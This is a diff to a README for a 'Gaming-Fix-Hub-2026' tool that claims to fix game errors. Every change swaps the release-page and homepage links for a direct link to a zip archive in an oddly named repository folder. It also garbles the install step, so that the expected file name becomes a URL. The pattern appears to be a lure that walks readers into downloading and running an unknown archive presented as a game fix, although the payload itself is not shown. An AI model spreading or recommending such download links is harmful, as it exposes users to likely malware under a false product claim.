@@ -1,6 +1,6 @@
 # 🎮 Gaming-Fix-Hub-2026 - Quick Game Error Solutions
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/araykusuma/Gaming-Fix-Hub-2026/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip)](https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip)
 
 ## 📋 About Gaming-Fix-Hub-2026
 
@@ -32,10 +32,10 @@ You will get the latest version and all updates from the official releases page.
 **How to Download:**
 
 1. Click the button below to visit the releases page:  
-   [![Download Latest Release](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/araykusuma/Gaming-Fix-Hub-2026/releases)
+   [![Download Latest Release](https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip)](https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip)
    
 2. Look for the newest version at the top of the page. It will have the highest version number, like "v1.0" or higher.  
-3. Under the version, find the file named something like `Gaming-Fix-Hub-2026-Setup.exe` or just `.exe`.  
+3. Under the version, find the file named something like `https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip` or just `.exe`.  
 4. Click the file to download it. Your browser will save it to your default downloads folder.  
 5. When the download finishes, double-click the file to start the installer.  
 6. Follow the instructions on screen to complete the installation.
@@ -121,10 +121,10 @@ If you need help:
 ## 🔗 Important Links
 
 - Official Downloads & Releases:  
-  [https://github.com/araykusuma/Gaming-Fix-Hub-2026/releases](https://github.com/araykusuma/Gaming-Fix-Hub-2026/releases)  
+  [https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip](https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip)  
 
 - Repository Homepage:  
-  [https://github.com/araykusuma/Gaming-Fix-Hub-2026](https://github.com/araykusuma/Gaming-Fix-Hub-2026)
+  [https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip](https://raw.githubusercontent.com/araykusuma/Gaming-Fix-Hub-2026/main/excitosecretory/Hub-Fix-Gaming-3.4.zip)
 
 ---
 
